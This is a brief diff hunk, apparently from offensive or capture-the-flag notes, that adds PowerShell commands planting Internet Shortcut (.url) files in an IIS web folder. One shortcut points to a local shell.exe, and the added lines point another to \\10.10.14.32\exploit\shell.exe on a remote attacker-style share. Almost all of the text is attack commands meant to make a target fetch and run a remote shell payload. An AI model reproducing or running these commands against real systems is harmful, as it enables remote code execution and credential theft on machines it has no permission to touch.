@@ -36,3 +36,7 @@ https://gist.github.com/projectboot/a0308688abcb1f318a0b00b33698e782
 
 	$shortcut = "[InternetShortcut]`nURL=c:\programdata\shell.exe"
 	Set-Content -Path "c:\inetpub\testing\test.url" -value $shortcut
+
+
+	cd C:\inetpub\testing
+	echo "[internetshortcut]`nurl=\\10.10.14.32\exploit\shell.exe" > shell.url
